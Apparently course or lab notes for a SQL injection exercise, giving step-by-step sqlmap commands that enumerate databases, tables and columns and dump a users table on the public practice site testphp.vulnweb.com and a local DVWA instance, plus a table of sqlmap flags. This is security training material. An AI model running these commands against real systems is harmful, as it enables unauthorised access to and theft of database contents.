--- LO2: SQL INJECTION (SQLMAP) ---

# Step 1: Help / command list
sqlmap --help

# Step 2: Fetch database names
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
  (Type Y to skip other-DBMS tests, N to skip full MySQL test set)

# Example against DVWA (with session cookie, low security):
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your_session_id>; security=low" --batch --dbs

# Step 3: Fetch tables from a database
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables

# Step 4: Fetch columns from a table
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns

# Step 5: Dump data from a table
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump

================================================================
 USEFUL SQLMAP FLAGS
================================================================
-u <url>        Target URL
--dbs           Enumerate databases
-D <db>         Specify database
--tables        Enumerate tables
-T <table>      Specify table
--columns       Enumerate columns
--dump          Dump table data
--cookie        Pass session cookie (for authenticated pages)
--batch         Non-interactive mode (auto default answers)
